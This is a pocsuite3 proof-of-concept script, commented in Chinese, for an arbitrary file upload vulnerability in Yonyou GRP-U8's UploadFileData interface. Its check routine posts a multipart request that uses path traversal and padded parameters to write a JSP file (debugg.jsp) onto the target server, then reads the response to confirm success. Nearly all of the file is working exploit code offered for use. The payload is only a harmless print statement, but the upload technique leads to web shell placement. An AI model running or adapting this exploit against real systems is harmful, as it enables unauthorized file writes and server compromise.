from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)

# 关于类的继承
class YYUPFPOC(POCBase):
    vulID = "0"  # ssvid ID
    version = "1"  # 默认为1
    author = "xans"  # PoC作者的大名
    vulDate = "2022-10-17"  # 漏洞公开的时间
    createDate = "2022-10-17"  # 编写 PoC 的日期
    updateDate = "2022-10-17"  # PoC 更新的时间
    references = ["http://121.4.99.97:81/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20GRP-U8%20UploadFileData%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"]  # 漏洞地址来源
    name = "用友任意文件上传漏洞 PoC"  # PoC 名称
    appPowerLink = "http://121.4.99.97:81/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20GRP-U8%20UploadFileData%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"  # 漏洞厂商主页地址
    appName = "用友"  # 漏洞应用名称
    appVersion = "用友 GRP-U8"  # 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_CREATION  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列
    # install_requires = []  # PoC 第三方模块依赖
    desc = """用友 GRP-U8 UploadFileData接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限"""  # 漏洞简要描述
    pocDesc = """"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        import requests

        cookies = {"JSESSIONID": "59227D2C93FE3E8C2626DA625CE710F9"}
        data = "------WebKitFormBoundary92pUawKc\r\nContent-Disposition: form-data; name=\"myFile\";filename=\"test.jpg\"\r\n\r\n<% out.println(\"123\");%>\r\n------WebKitFormBoundary92pUawKc--"
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9",
            "Content-Type": "multipart/form-data", "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"}
        result = []

        try:
            full_url = f"{self.url}/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=debugg.jsp&filename=1.jpg"
            res = requests.post(full_url, headers=headers,cookies=cookies, data=data, verify=False, timeout=9,allow_redirects=False)
            # 判断是否存在漏洞
            if res.status_code == 200 and 'parent.openWin.location.reload();' in res.text:
                result.append(self.url)
        except Exception as e:
            print(e)

        finally:
            return result

    def _verify(self):

        result = {}
        res = self._check()
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):

        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass

def other_utils_func():
    pass


register_poc(YYUPFPOC)